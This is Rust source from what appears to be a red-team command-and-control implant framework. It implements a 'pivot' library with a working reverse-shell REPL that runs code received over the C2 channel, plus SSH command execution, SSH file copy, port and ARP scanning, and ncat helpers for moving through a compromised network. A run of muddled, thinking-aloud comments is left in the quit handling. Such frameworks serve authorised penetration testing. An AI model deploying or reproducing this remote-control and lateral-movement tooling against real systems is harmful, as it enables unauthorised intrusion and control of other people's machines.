use super::PivotLibrary;
use alloc::collections::BTreeMap;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use eldritch_agent::Agent;
use eldritch_core::{Interpreter, Value};
use eldritch_macros::eldritch_library_impl;
use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
use transport::{ActiveTransport, Transport};

use eldritch_repl::{Repl, ReplAction};
use crossterm::{QueueableCommand, cursor, terminal};
use std::io::{BufWriter, Write};

#[eldritch_library_impl(PivotLibrary)]
pub struct StdPivotLibrary {
    pub agent: Arc<dyn Agent>,
    pub transport: ActiveTransport,
    pub task_id: i64,
}

impl core::fmt::Debug for StdPivotLibrary {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("StdPivotLibrary")
            .field("task_id", &self.task_id)
            .finish()
    }
}

impl StdPivotLibrary {
    pub fn new(agent: Arc<dyn Agent>, transport: ActiveTransport, task_id: i64) -> Self {
        Self {
            agent,
            transport,
            task_id,
        }
    }
}

// Re-export impls from modules
use super::arp_scan_impl;
use super::ncat_impl;
use super::port_scan_impl;
use super::reverse_shell_pty_impl;
use super::ssh_copy_impl;
use super::ssh_exec_impl;

// Import our new Session helper
pub mod ssh_session;
pub use ssh_session::Session;

// Import local REPL modules
pub mod repl {
    pub mod parser;
    pub mod terminal;
}
use repl::parser::InputParser;
use repl::terminal::{VtWriter, render};

#[derive(Debug)]
struct ChannelPrinter {
    sender: std::sync::mpsc::Sender<ReverseShellRequest>,
    task_id: i64,
}

impl eldritch_core::Printer for ChannelPrinter {
    fn print_out(&self, _span: &eldritch_core::Span, val: &str) {
        // We use \r\n for raw mode terminal
        let s_crlf = val.replace('\n', "\r\n");
        let display_s = alloc::format!("{s_crlf}\r\n");

        let _ = self.sender.send(ReverseShellRequest {
            data: display_s.as_bytes().to_vec(),
            task_id: self.task_id,
            kind: pb::c2::ReverseShellMessageKind::Data as i32,
            ..Default::default()
        });
    }

    fn print_err(&self, _span: &eldritch_core::Span, val: &str) {
        let s_crlf = val.replace('\n', "\r\n");
        let display_s = alloc::format!("{s_crlf}\r\n");

        let _ = self.sender.send(ReverseShellRequest {
            data: display_s.as_bytes().to_vec(),
            task_id: self.task_id,
            kind: pb::c2::ReverseShellMessageKind::Data as i32,
            ..Default::default()
        });
    }
}

impl PivotLibrary for StdPivotLibrary {
    fn reverse_shell_pty(&self, cmd: Option<String>) -> Result<(), String> {
        reverse_shell_pty_impl::run(self, cmd)
    }

    fn reverse_shell_repl(&self, interp: &mut Interpreter) -> Result<(), String> {
        // Channels for bridging
        let (printer_tx, printer_rx) = std::sync::mpsc::channel::<ReverseShellRequest>();
        let (loop_tx, loop_rx) = std::sync::mpsc::channel::<ReverseShellResponse>();

        // We need to clone transport to move into subtask
        let mut t = self.transport.clone();

        let subtask_future = async move {
            // Create tokio channels for transport
            let (transport_rx_sender, transport_rx_receiver) = tokio::sync::mpsc::channel::<ReverseShellRequest>(100);
            let (transport_tx_sender, mut transport_tx_receiver) = tokio::sync::mpsc::channel::<ReverseShellResponse>(100);

            // Bridge: Std -> Tokio
            let tx_bridge = transport_rx_sender.clone();
            tokio::task::spawn_blocking(move || {
                for msg in printer_rx {
                    if tx_bridge.blocking_send(msg).is_err() {
                        break;
                    }
                }
            });

            // Bridge: Tokio -> Std
            let loop_tx_clone = loop_tx.clone();
            tokio::spawn(async move {
                while let Some(msg) = transport_tx_receiver.recv().await {
                    if loop_tx_clone.send(msg).is_err() {
                        break;
                    }
                }
            });

            // Run transport
            let _ = t.reverse_shell(transport_rx_receiver, transport_tx_sender).await;
        };

        // Spawn the subtask
        self.agent
            .spawn_subtask(self.task_id, "repl_bridge".to_string(), alloc::boxed::Box::pin(subtask_future))
            .map_err(|e| e.to_string())?;

        // Setup printer
        let old_printer = interp.env.read().printer.clone();
        interp.env.write().printer = Arc::new(ChannelPrinter {
            sender: printer_tx.clone(),
            task_id: self.task_id,
        });

        // Initialize REPL state
        let mut repl = Repl::new();
        let stdout_writer = VtWriter {
            tx: printer_tx.clone(),
            task_id: self.task_id,
        };
        let mut stdout = BufWriter::new(stdout_writer);

        // Initial Render
        let _ = render(&mut stdout, &repl, None);

        let mut parser = InputParser::new();
        let mut previous_buffer = String::new();

        // Run Loop
        for resp in loop_rx {
            if resp.kind == ReverseShellMessageKind::Ping as i32 {
                // Echo ping
                let _ = printer_tx.send(ReverseShellRequest {
                    kind: ReverseShellMessageKind::Ping.into(),
                    data: resp.data,
                    task_id: self.task_id,
                });
                continue;
            }
            if resp.data.is_empty() {
                continue;
            }

            // Parse input
            let inputs = parser.parse(&resp.data);
            let mut pending_render = false;

            for (i, input) in inputs.iter().enumerate() {
                let action = repl.handle_input(input.clone());
                match action {
                    ReplAction::Render => {
                        pending_render = true;
                    }
                    other => {
                        if pending_render {
                            let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                            previous_buffer = repl.get_render_state().buffer;
                            pending_render = false;
                        }

                        match other {
                            ReplAction::Quit => {
                                // Handled below to restore printer
                            }
                            ReplAction::Submit { ref code, .. } => {
                                // Move to next line
                                let _ = stdout.write_all(b"\r\n");
                                let _ = stdout.flush();

                                // Execute
                                match interp.interpret(code) {
                                    Ok(v) => {
                                        if !matches!(v, Value::None) {
                                            // Print result
                                            let s = alloc::format!("{:?}", v);
                                            let s_crlf = s.replace('\n', "\r\n");
                                            let _ = stdout.write_all(s_crlf.as_bytes());
                                            let _ = stdout.write_all(b"\r\n");
                                        }
                                    }
                                    Err(e) => {
                                        let s = alloc::format!("Error: {}", e);
                                        let s_crlf = s.replace('\n', "\r\n");
                                        let _ = stdout.write_all(s_crlf.as_bytes());
                                        let _ = stdout.write_all(b"\r\n");
                                    }
                                }
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer.clear();
                            }
                            ReplAction::AcceptLine { .. } => {
                                let _ = stdout.write_all(b"\r\n");
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer.clear();
                            }
                            ReplAction::ClearScreen => {
                                let _ = stdout.queue(terminal::Clear(terminal::ClearType::All));
                                let _ = stdout.queue(cursor::MoveTo(0, 0));
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer = repl.get_render_state().buffer;
                            }
                            ReplAction::Complete => {
                                let state = repl.get_render_state();
                                let (start, completions) =
                                    interp.complete(&state.buffer, state.cursor);
                                repl.set_suggestions(completions, start);
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer = repl.get_render_state().buffer;
                            }
                            ReplAction::None => {}
                            ReplAction::Render => unreachable!(),
                        }

                        // Check original action for Quit, which doesn't move value because match above was on other
                        // Wait, `other` is moved into match above if not by ref?
                        // `other` is consumed by match?
                        // `ReplAction` is not Copy.
                        // I need to clone or match differently.
                        // Actually, I just matched `other`. It is consumed.
                        // So I cannot use it in `matches!(other, ...)`.
                        // I can just check inside the match arm for Quit.

                        // BUT, I can't return easily from inside the match arm because `other` is local variable, not control flow of loop.
                        // I can break the loop.
                        // But I am inside `for input in inputs`.
                        // If I return, I exit the function. That's fine.

                        // So:
                        if let ReplAction::Quit = other {
                             // Restore printer
                            interp.env.write().printer = old_printer;
                            return Ok(());
                        }
                    }
                }

                if i == inputs.len() - 1 && pending_render {
                    let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                    previous_buffer = repl.get_render_state().buffer;
                    pending_render = false;
                }
            }
        }

        // Restore printer
        interp.env.write().printer = old_printer;

        Ok(())
    }

    fn ssh_exec(
        &self,
        target: String,
        port: i64,
        command: String,
        username: String,
        password: Option<String>,
        key: Option<String>,
        key_password: Option<String>,
        timeout: Option<i64>,
    ) -> Result<BTreeMap<String, Value>, String> {
        ssh_exec_impl::run(
            self,
            target,
            port,
            command,
            username,
            password,
            key,
            key_password,
            timeout,
        )
    }

    fn ssh_copy(
        &self,
        target: String,
        port: i64,
        src: String,
        dst: String,
        username: String,
        password: Option<String>,
        key: Option<String>,
        key_password: Option<String>,
        timeout: Option<i64>,
    ) -> Result<String, String> {
        ssh_copy_impl::run(
            self,
            target,
            port,
            src,
            dst,
            username,
            password,
            key,
            key_password,
            timeout,
        )
    }

    fn port_scan(
        &self,
        target_cidrs: Vec<String>,
        ports: Vec<i64>,
        protocol: String,
        timeout: i64,
        fd_limit: Option<i64>,
    ) -> Result<Vec<BTreeMap<String, Value>>, String> {
        port_scan_impl::run(self, target_cidrs, ports, protocol, timeout, fd_limit)
    }

    fn arp_scan(&self, target_cidrs: Vec<String>) -> Result<Vec<BTreeMap<String, Value>>, String> {
        arp_scan_impl::run(self, target_cidrs)
    }

    fn ncat(
        &self,
        address: String,
        port: i64,
        data: String,
        protocol: String,
    ) -> Result<String, String> {
        ncat_impl::run(self, address, port, data, protocol)
    }
}
